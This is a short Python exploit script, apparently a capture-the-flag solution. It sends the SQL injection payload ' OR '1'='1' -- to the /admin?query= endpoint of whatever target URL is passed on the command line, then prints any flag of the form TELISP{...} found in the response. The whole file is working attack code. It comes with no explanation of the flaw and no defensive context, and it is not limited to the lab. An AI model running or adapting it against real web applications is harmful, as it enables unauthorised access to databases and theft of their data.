#!/usr/bin/env python3
import requests
import sys
import urllib.parse

def exploit_sql_injection(url, payload):
    """
    Exploit SQL injection vulnerability in the admin panel
    """
    try:
        # Encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Send the request
        response = requests.get(f"{url}/admin?query={encoded_payload}")
        
        # Check if we got the flag
        if "TELISP{" in response.text:
            print("[+] Success! Found flag:")
            print(response.text.split("TELISP{")[1].split("}")[0])
            return True
        else:
            print("[-] No flag found in response")
            return False
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 sql_injection.py <target_url>")
        sys.exit(1)
        
    target_url = sys.argv[1]
    payload = "' OR '1'='1' --"
    
    print("[*] Attempting SQL injection...")
    exploit_sql_injection(target_url, payload) 